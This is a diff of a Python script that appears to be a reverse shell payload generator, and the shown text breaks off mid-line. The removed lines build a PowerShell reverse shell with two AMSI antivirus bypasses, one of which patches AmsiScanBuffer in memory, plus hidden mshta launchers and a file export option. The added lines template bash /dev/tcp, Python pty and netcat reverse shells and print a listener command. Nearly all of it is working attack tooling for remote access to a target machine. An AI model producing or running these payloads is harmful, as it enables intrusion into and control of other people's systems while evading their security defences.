@@ -1,141 +1,49 @@
 #!/usr/bin/env python3
-import base64
+
 import sys
-import os
 
-# --- PAYLOAD COMPONENTS ---
+# Color Codes
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
+RED = "\033[91m"
+CYAN = "\033[96m"
+RESET = "\033[0m"
 
-REVERSE_SHELL_LOGIC = (
-    "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
-    "$stream = $client.GetStream();"
-    "[byte[]]$bytes = 0..65535|%{{0}};"
-    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
-    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
-    "$sendback = (iex $data 2>&1 | Out-String );"
-    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
-    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
-    "$stream.Write($sendbyte,0,$sendbyte.Length);"
-    "$stream.Flush()}};$client.Close()"
-)
+def print_output(final_command, desc, lport):
+    """Print the payload and execution instructions with color."""
+    print(f"\n{CYAN}[*] Payload Description:{RESET} {desc}")
+    print(f"{CYAN}[*] Listening Port:{RESET} {lport}\n")
+    print(f"{GREEN}[+] Your Payload Command:{RESET}\n")
+    print(final_command)
+    print(f"\n{YELLOW}To start a listener, run the following command:{RESET}")
+    print(f"nc -lvnp {lport}\n")
 
-AMSI_BYPASS_SIMPLE = (
-    "$a='System.Management.Automation.A';"
-    "$b='msiUtils';"
-    "$c=[Ref].Assembly.GetType(('{0}{1}'-f$a,$b));"
-    "$d=$c.GetField(('a'+'msiInitFailed'),'NonPublic,Static');"
-    "$d.SetValue($null,$true);"
-)
-
-AMSI_BYPASS_ADVANCED = (
-    "Add-Type @' using System;using System.Runtime.InteropServices;"
-    "public class Win32{[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);"
-    "[DllImport(\"kernel32\")]public static extern IntPtr LoadLibrary(string name);"
-    "[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSize,uint flNewProtect,out uint lpflOldProtect);}'@;"
-    "$Amsi=[Win32]::LoadLibrary('amsi.dll');"
-    "$AmsiScanBuffer=[Win32]::GetProcAddress($Amsi,'AmsiScanBuffer');"
-    "[Win32]::VirtualProtect($AmsiScanBuffer,[UIntPtr]5,0x40,[ref]0)|Out-Null;"
-    "$Patch=[Byte[]](0x31,0xff,0x90);"
-    "[System.Runtime.InteropServices.Marshal]::Copy($Patch,0,$AmsiScanBuffer,3);"
-)
-
-# --- HELPER FUNCTIONS ---
-def generate_final_command(ps_command, use_base64, wrapper_type):
-    if use_base64:
-        encoded_ps = base64.b64encode(ps_command.encode('utf-16-le')).decode()
-        ps_launcher = f"powershell.exe -nop -w hidden -e {encoded_ps}"
-    else:
-        escaped_ps_command = ps_command.replace('"', '`"')
-        ps_launcher = f'powershell.exe -nop -w hidden -c "{escaped_ps_command}"'
-
-    if wrapper_type == 'none':
-        return ps_launcher
-    elif wrapper_type == 'mshta':
-        return f'mshta.exe vbscript:CreateObject("Wscript.Shell").Run("{ps_launcher}",0,True)'
-    elif wrapper_type == 'cmd_mshta':
-        return f'cmd.exe /c mshta.exe vbscript:CreateObject("Wscript.Shell").Run("{ps_launcher}",0,True)'
-    else:
-        raise ValueError("[!] Invalid wrapper type provided.")
-
-def print_output(final_command, payload_desc, port):
-    encoding_type = "BASE64 ENCODED" if "-e " in final_command else "RAW (NON-ENCODED)"
-    print("\n" + "=" * 50)
-    print(f"WINDOWS PAYLOAD ({payload_desc.upper()}) - GENERATION COMPLETE")
-    print(f"({encoding_type})")
-    print("=" * 50)
-    print("\n[1] Start this listener on your Linux machine:")
-    print(f"\033[92mnc -lvnp {port}\033[0m")
-    print("\n[2] Run this command on the target Windows machine:")
-    print(f"\033[93m{final_command}\033[0m\n")
-
-def export_to_file(payload):
-    export_choice = input("Do you want to export the payload to a file? (y/n): ").lower().strip()
-    if export_choice == 'y':
-        file_name = input("Enter filename (default: payload.txt): ").strip() or "payload.txt"
-        if os.path.exists(file_name):
-            overwrite = input(f"[!] File '{file_name}' exists. Overwrite? (y/n): ").lower().strip()
-            if overwrite != 'y':
-                print("[!] Export canceled. Showing payload below.")
-                print(payload)
-                return
-        try:
-            with open(file_name, 'w') as f:
-                f.write(payload)
-            abs_path = os.path.abspath(file_name)
-            print(f"\n[+] Payload saved to: {abs_path}")
-        except Exception as e:
-            print(f"[!] Error saving file: {e}")
-    else:
-        print("\n[!] Payload not exported. Here is the command:")
-        print(payload)
-
-# --- MAIN LOGIC ---
 def main():
-    menu = {
-        '1': ("Simple PowerShell Payload", 'none', ""),
-        '2': ("Payload with Simple AMSI Bypass", 'none', AMSI_BYPASS_SIMPLE),
-        '3': ("Payload with MSHTA Wrapper", 'mshta', AMSI_BYPASS_SIMPLE),
-        '4': ("Payload with Advanced AMSI Bypass", 'mshta', AMSI_BYPASS_ADVANCED),
-        '5': ("Payload with CMD + MSHTA Wrapper", 'cmd_mshta', AMSI_BYPASS_ADVANCED)
+    print(f"{CYAN}--- Reverse Shell Payload Generator ---{RESET}\n")
+    
+    # Collecting user input
+    ip = input("Enter your IP address: ").strip()
+    lport = input("Enter listening port: ").strip()
+    
+    # Payload templates
+    payloads = {
+        "1": {
+            "desc": "Bash TCP Reverse Shell",
+            "template": "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+        },
+        "2": {
+            "desc": "Python Reverse Shell",
+            "template": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
+        },
+        "3": {
+            "desc": "Netcat Reverse Shell",
+            "template": "nc -e /bin/sh {ip} {port}"
+        }
     }
-
-    print("--- Windows Reverse Shell Payload Generator ---")
-    for key, (desc, _, _) in menu.items():
-        print(f"  {key}) {desc}")
-
-    try:
-        choice = input("Select payload type (1-5): ").strip()
-        if choice not in menu:
-            print("\n[!] Invalid choice. Exiting.", file=sys.stderr)
-            sys.exit(1)
-
-        desc, wrapper, amsi_logic = menu[choice]
-
-        lhost = input("Enter your listener IP address (LHOST): ").strip()
-        lport = input("Enter your listener port (LPORT): ").strip()
-        if not lhost or not lport:
-            print("\n[!] IP address and port cannot be empty.", file=sys.stderr)
-            sys.exit(1)
-
-        use_base64_input = input("Use Base64 encoding? (y/n, default: y): ").lower().strip()
-        use_base64 = use_base64_input != 'n'
-
-        # Build PowerShell command
-        shell_logic = REVERSE_SHELL_LOGIC.format(ip=lhost, port=lport)
-        ps_command = f"{amsi_logic}{shell_logic}" if amsi_logic else shell_logic
-
-        # Generate payload
-        final_command = generate_final_command(ps_command, use_base64, wrapper)
-
-        # Output + Option to export
-        print_output(final_command, desc, lport)
-        export_to_file(final_command)
-
-    except (KeyboardInterrupt, EOFError):
-        print("\n\n[!] Script terminated by user.")
-        sys.exit(0)
-    except Exception as e:
-        print(f"\n[!] Error: {e}", file=sys.stderr)
-        sys.exit(1)
-
-if __name__ == "__main__":
-    main()
+    
+    # Display options
+    print("\nSelect Payload Type:")
+    for key, value in payloads.items():
+        print(f"{key}. {value['desc']}")
+    
+    choice = input("\nEnter c
